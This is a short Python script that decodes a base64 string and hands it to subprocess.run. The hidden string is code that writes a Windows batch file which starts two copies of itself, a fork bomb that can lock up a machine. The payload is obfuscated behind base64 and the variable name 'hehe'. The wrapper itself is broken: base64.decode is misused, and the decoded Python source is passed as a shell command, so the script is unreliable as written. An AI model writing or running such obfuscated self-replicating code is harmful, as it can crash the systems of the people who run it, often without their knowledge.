import subprocess
import base64

hehe = "aW1wb3J0IHN1YnByb2Nlc3MKd2l0aCBvcGVuKCdvdXRwdXQuYmF0JywgJ3cnKSBhcyBmaWxlOgogICAgZmlsZS53cml0ZSgnQGVjaG8gb2ZmXG5zdGFydCBvdXRwdXQuYmF0ICZcbnN0YXJ0IG91dHB1dC5iYXQgJicpCnN1YnByb2Nlc3MuUG9wZW4oJ291dHB1dC5iYXQnLHNoZWxsPVRydWUp"

subprocess.run(base64.decode(hehe))